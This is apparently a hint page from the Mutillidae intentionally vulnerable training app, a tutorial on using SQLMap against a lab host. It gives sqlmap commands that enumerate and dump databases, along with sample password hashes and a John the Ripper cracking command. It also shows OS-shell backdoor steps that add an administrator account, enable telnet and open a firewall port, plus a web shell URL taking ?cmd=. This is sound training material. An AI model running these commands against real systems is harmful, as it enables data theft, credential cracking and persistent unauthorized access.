			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Note: See the SQL injection hint page for help specific to SQL injection. This page is dedicated
			to the tool SQLMap which can be helpful to evaluate the risk exposed by SQL injection
			vulnerabilities.
			<br/><br/>
			SQLMap is an open source penetration testing tool that automates the
			process of detecting and exploiting SQL injection flaws. It is
			widely considered the best open-source SQL injection testing tool
			available.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Running SQLMAP Help</span>
			<br/><br/>
			Note: On Kali Linux, SQLMap is found in /usr/share/sqlmap/
			<br/><br/>
			sqlmap --help	Help<br/>
			sqlmap -hh		Double the help
			<br/><br/>
			<span class="report-header">
				Running SQLMAP &quot;Manually&quot;
			</span>
			<br/><br/>
			sqlmap.py --url=&quot;http://192.168.56.102/mutillidae/index.php?page=login.php&quot; --data=&quot;username=asdf&amp;password=asdf&amp;login-php-submit-button=Login&quot; --banner
			<br/><br/>
			<span class="report-header">Capturing Request To Pass To SQLMAP</span>
			<br/><br/>
			Create a valid HTTP request on the target page. Do not inject malicious input into this request.
			For example, using Burp-Suite Capture the request in Burp-Proxy --> Intercept
			or lookup request in Burp-Proxy --> HTTP History.
			<br/><br/>
			Copy the HTTP request and save to a text file. gedit is a reasonable editor.
			Save request to a file such as ~/engagements/sqlmap/login.php.request. The -r switch takes the file path.
			<br/><br/>
			Here is a sample request for URL: http://192.168.56.102/mutillidae/index.php?page=login.php
			<br/><br/>
			Request:
			<br/>
			<span style="white-space: pre;">
POST /mutillidae/index.php?page=login.php HTTP/1.1
Host: 192.168.56.102
User-Agent: Mozilla/5.0 (X11; Linux i686 on x86_64; rv:17.0) Gecko/20100101 Firefox/17.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://192.168.56.102/mutillidae/index.php?page=login.php
Cookie: showhints=0; PHPSESSID=fik978dbhcujcgdjfc2lg249r4
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

username=asdf&amp;password=asdf&amp;login-php-submit-button=Login
</span>
			<br/>
			<span class="report-header">
			Running SQLMAP with &quot;auto-parse&quot;
			</span>
			<br/><br/>
			Start sqlmap telling sqlmap path to file containing HTTP request.
			Attempting to enumerate database server information is a good start (--banner).
			SQLMap will parse URL and input parameters then attempt to determine database brand and injection points.
			<br/><br/>
				sqlmap -r ~/engagements/sqlmap/login.php.request &lt;options&gt;
			<br/><br/>
			sqlmap may find SQL injection automatically.
			But performing recon and initial testing on application can greatly enhance chance of success.
			Fingerprint database and inform SQLMap with --dbms parameter.
			Determine likely parameter and tell SQLMap with -p parameter.
			<br/><br/>
			Example: sqlmap -r /tmp/request -p username --dbms=MySQL --banner
			<br/><br/>
			Once a vulnerable parameter identified begin to enumerate data structures
			<br/><br/>
			Databases
			<br/><br/>
			--dbs
			<br/><br/>
			Tables in databases
			<br/><br/>
			--tables
			<br/><br/>
			Columns in tables
			<br/><br/>
			--columns
			<br/><br/>
			Feed each piece of information discovered into next round of testing
			<br/><br/>
			Once target information located, extract information with --dump.
			SQLMap can perform many other attacks depending on the privileges allocated to the application ID
			<br/><br/>
			<span class="report-header">
			Running SQLMAP with various features
			</span>
			<br/><br/>
						sqlmap -r ~/engagements/sqlmap/login.php.request &lt;options&gt;
						<br/>
<span style="white-space: pre;">
--banner

	web server operating system: Windows
	web application technology: PHP 5.4.4, Apache 2.4.2
	back-end DBMS: MySQL 5.0
	banner:    &#39;5.5.25a&#39;

--fingerprint

	web server operating system: Windows
	web application technology: PHP 5.4.4, Apache 2.4.2
	back-end DBMS: active fingerprint: MySQL &gt;= 5.5.0

    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA

	current user:    &#39;root@localhost&#39;
	current database:    &#39;nowasp&#39;
	current user is DBA:    True
	hostname:    &#39;mutillid-7se1xr&#39;

    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes

	database management system users
	[*] &#39;&#39;@&#39;localhost&#39;
	[*] &#39;pma&#39;@&#39;localhost&#39;
	[*] &#39;root&#39;@&#39;linux&#39;
	[*] &#39;root&#39;@&#39;localhost&#39;

    --dbs               Enumerate DBMS databases

	available databases[10]:
	[*] cdcol
	[*] information_schema
	[*] mysql
	[*] nowasp
	[*] owasp10
	[*] owasp13
	[*] performance_schema
	[*] test
	[*] webauth
</span>
<br/><br/>
<span class="report-header">
Enumerate DBMS database tables, columns, structure (schema)
</span>
<br/>
<span style="white-space: pre;">
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table to enumerate
    -C COL              DBMS database table column to enumerate
    -U USER             DBMS user to enumerate
</span>
<br/><br/>
							<span class="report-header">
								Extracting data
							</span>
							<br/><br/>
<span style="white-space: pre;">
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table to enumerate
    -C COL              DBMS database table column to enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --start=LIMITSTART  First query output entry to retrieve
    --stop=LIMITSTOP    Last query output entry to retrieve
    --sql-query=QUERY   SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
</span>
							<br/><br/>
							<span class="report-header">
							Listing columns from tables
							</span>
							<br/><br/>
<span style="white-space: pre;">
	sqlmap -r ~/engagements/sqlmap/login.php.request -D mysql -T user --columns
	sqlmap -r ~/engagements/sqlmap/login.php.request -D mysql -T user --common-columns
	sqlmap -r ~/engagements/sqlmap/login.php.request -D mysql
	--sql-query=&quot;select column_name from information_schema.columns where table_name = &#39;user&#39;&quot;

	select column_name from information_schema.columns where table_name = &#39;user&#39; [42]:
		[*] Alter_priv
		[*] Alter_routine_priv
		[*] authentication_string
		[*] Create_priv
		[*] Create_routine_priv
		[*] Create_tablespace_priv
		[*] Create_tmp_table_priv
		[*] Create_user_priv
		[*] Create_view_priv
		[*] Delete_priv
		[*] Drop_priv
		[*] Event_priv
		[*] Execute_priv
		[*] File_priv
		[*] Grant_priv
		[*] Host
		[*] Index_priv
		[*] Insert_priv
		[*] Lock_tables_priv
		[*] max_connections
		[*] max_questions
		[*] max_updates
		[*] max_user_connections
		[*] Password
		[*] plugin
		[*] Process_priv
		[*] References_priv
		[*] Reload_priv
		[*] Repl_client_priv
		[*] Repl_slave_priv
		[*] Select_priv
		[*] Show_db_priv
		[*] Show_view_priv
		[*] Shutdown_priv
		[*] ssl_cipher
		[*] ssl_type
		[*] Super_priv
		[*] Trigger_priv
		[*] Update_priv
		[*] User
		[*] x509_issuer
		[*] x509_subject
</span>
								<br/><br/>
								<span class="report-header">
									Advanced: Modifying injections
								</span>
							<br/><br/>
<span style="white-space: pre;">
	SELECT * FROM accounts WHERE username=&#39;&#39; AND password=&#39;&#39;&#39;

	sqlmap -r ~/engagements/sqlmap/login.php.request --prefix=&quot;SELECT * FROM accounts WHERE username=&#39;&quot; --suffix=&quot;&#39;-- &quot; --banner

    --prefix=PREFIX     Injection payload prefix string
    --suffix=SUFFIX     Injection payload suffix string
</span>
<br/><br/>
<span class="report-header">
Advanced: Dealing with inconsistent results
</span>
<br/><br/>
<span style="white-space: pre;">
	select User, Password from mysql.user

	versus

	sqlmap -r ~/engagements/sqlmap/login.php.request -D mysql --sql-query=&quot;select User, Password from mysql.user order by User desc&quot;

	select User, Password from mysql.user order by User desc

	select User, Password, Host, authentication_string from mysql.user order by User desc [9]:
		[*] root, , localhost,
		[*] root, , linux,
		[*] pma, , localhost,
		[*] Simba, *F43B942A34347297C3B0455DAB190AFB9BBF13B5, localhost,
		[*] Rocky, *2BA8DF85753BE61F6C72A8784B11E68A41878032, localhost,
		[*] Patches, *2027D9391E714343187E07ACB41AE8925F30737E, localhost,
		[*] Happy, *160E7D8EE3A97BED0F0AD1563BFB619178D15D7B, localhost,
		[*] , , localhost,
		[*] , , linux,
</span>
						<br/><br/>
						<span class="report-header">
						Cracking MySQL Password Hashes
						</span>
						<br/><br/>
<span style="white-space: pre;">
John the Ripper Command  Line

/pentest/passwords/john/john --format=mysql-sha1 /tmp/mysql.hashes

Password Hashes in MySQL Format

Simba:*F43B942A34347297C3B0455DAB190AFB9BBF13B5
Rocky:*2BA8DF85753BE61F6C72A8784B11E68A41878032
Patches:*2027D9391E714343187E07ACB41AE8925F30737E
Happy:*160E7D8EE3A97BED0F0AD1563BFB619178D15D7B
</span>
<br/><br/>
<span class="report-header">
Understanding sqlmap O/S Shell
</span>
<br/><br/>
<span style="white-space: pre;">
View transaction: tcpdump -i eth1 -vvv -X
1st Stage Uploader
2nd Stage Command Shell Page

sc query state= all
sc query tlntsvr
sc config tlntsvr start= demand
sc start tlntsvr
net user root toor /add
net localgroup TelnetClients /add
net localgroup Administrators root /add
net localgroup TelnetClients root /add
netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom addresses=192.168.56.101
</span>
			<br/><br/>
			<span class="report-header">
				Interacting Directly with sqlmap O/S Shell Backdoor
			</span>
			<br/><br/>
			http://192.168.56.102/&lt;temp file name&gt;?cmd=ping%20192.168.56.101
			<br/><br/>
			<span class="report-header">
			Direct connection to the database
			</span>
			<br/><br/>
<span style="white-space: pre;">
	Installing Py-MySQL Dependency

		git clone https://github.com/petehunt/PyMySQL/
		cd PyMySQL
		python setup.py install
		cd ..
		rm -rf PyMySQL

	sqlmap -d mysql://root:&quot;&quot;@192.168.56.102:5123/nowasp
</span>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<br/><br/>